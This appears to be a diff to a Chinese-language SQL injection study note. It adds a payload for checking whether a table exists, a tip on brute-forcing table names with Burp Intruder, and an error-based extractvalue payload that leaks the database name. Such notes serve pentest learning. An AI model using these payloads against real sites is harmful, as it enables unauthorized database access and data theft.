@@ -84,7 +84,13 @@ concat_ws(spet,str1,str2)，spet 为分隔符，使用 16 进制表示，str1 �
 
 <br>
 
-####
+#### 判断表是否存在
+
+`asd' and exists(select * from ohmygod)`  
+没有找到指定表就会报错；  
+使用 burp 抓取，丢到 intruder 里面，为表名加上$，payloads 设置字典，一直撞直到撞出真正的表即可！！！
+
+<br>
 
 ### 回显错误
 
@@ -110,6 +116,15 @@ updatexml (XML_document, XPath_string, new_value);
 
 注入后，SQL 校验出错，返回报错信息，同时执行了我们想要的查询代码 `select user()`  
 结果：`XPATH syntax error: '~sqli@localhost'`
+
+<br>
+
+#### extractvalue
+
+和 updatexml 用法完全一致；
+
+例子：`extractvalue(0,concat('~',database()))`  
+第一个参数乱写，第二个就按照 updatexml 的规矩来走
 
 <br>
 
